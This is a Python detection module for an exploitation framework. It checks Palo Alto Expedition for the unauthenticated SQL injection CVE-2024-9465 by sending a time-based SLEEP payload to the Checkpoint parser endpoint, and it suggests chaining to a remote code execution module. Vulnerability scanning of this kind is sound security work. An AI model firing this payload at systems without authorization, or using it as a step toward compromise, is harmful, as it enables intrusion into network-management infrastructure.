#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Palo Alto Expedition unauthenticated SQLi (CVE-2024-9465, Horizon3)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Palo Alto Expedition CVE-2024-9465 SQLi Detect",
        "description": (
            "Horizon3 check: Checkpoint parser SQL injection via SLEEP(10). "
            "No session — chain with exploits/multi/http/paloalto_expedition_cve_2024_9464_rce."
        ),
        "author": ["Horizon3 Attack Team", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2024-9465"],
        "references": [
            "https://github.com/horizon3ai/CVE-2024-9465",
            "https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/",
        ],
        "tags": ["web", "scanner", "palo-alto", "expedition", "sqli"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "exploit_paths"],
            "chain": {
                "suggested_followups": [
                    "exploits/multi/http/paloalto_expedition_cve_2024_9464_rce",
                    "scanner/http/cve_2024_5910_detect",
                ],
            },
        },
    }

    CHECKPOINT_PATH = "/bin/configurations/parsers/Checkpoint/CHECKPOINT.php"
    sleep_seconds = OptInteger(10, "SLEEP() duration for timing check", required=False, advanced=True)

    def _ensure_checkpoint_table(self) -> bool:
        data = {
            "action": "get",
            "type": "existing_ruleBases",
            "project": "pandbRBAC",
        }
        r = self.http_request(method="POST", path=self.CHECKPOINT_PATH, data=data, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        return "ruleBasesNames" in (r.text or "")

    def run(self):
        if not self._ensure_checkpoint_table():
            return False

        sleep_n = int(self.sleep_seconds or 10)
        payload = f"1 AND (SELECT 1234 FROM (SELECT(SLEEP({sleep_n})))horizon3)"
        data = {
            "action": "import",
            "type": "test",
            "project": "pandbRBAC",
            "signatureid": payload,
        }
        start = time.monotonic()
        r = self.http_request(
            method="POST",
            path=self.CHECKPOINT_PATH,
            data=data,
            allow_redirects=False,
        )
        elapsed = time.monotonic() - start
        if not r or r.status_code != 200:
            return False
        low = sleep_n - 1
        high = sleep_n + 5
        if elapsed > low and elapsed < high:
            self.set_info(
                severity="critical",
                cve="CVE-2024-9465",
                reason=f"Expedition Checkpoint SQLi SLEEP({sleep_n}) ~{elapsed:.1f}s",
                path=self.CHECKPOINT_PATH,
            )
            return True
        return False
